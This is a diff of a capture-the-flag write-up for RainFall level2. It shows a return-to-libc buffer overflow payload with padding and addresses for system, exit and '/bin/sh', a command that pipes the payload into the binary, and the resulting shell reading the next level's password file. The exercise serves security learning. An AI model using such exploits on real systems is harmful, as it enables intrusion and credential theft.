@@ -143,12 +143,13 @@ Alright, let's craft our payload:
 ```
 reminder: padding + address of system + address of exit + address of "/bin/sh"
 
-"\x90"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xd0\x83\x04\x08" + "\x58\xcc\xf8\xb7"
+0804853e b7e6b060 080483d0 b7f8cc58
+"\x90"*80 + "\x08\x04\x85\x3e" + "\xb7\xe6\xb0\x60" + "\x08\x04\x83\xd0" + "\xb7\xf8\xcc\x58"
 ```
 
 Let's run it:
 ```bash
-level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xd0\x83\x04\x08" + "\x58\xcc\xf8\xb7")' && cat) | ./level2
+level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && cat) | ./level2
 ����������������������������������������������������������������>������������>`��X���
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
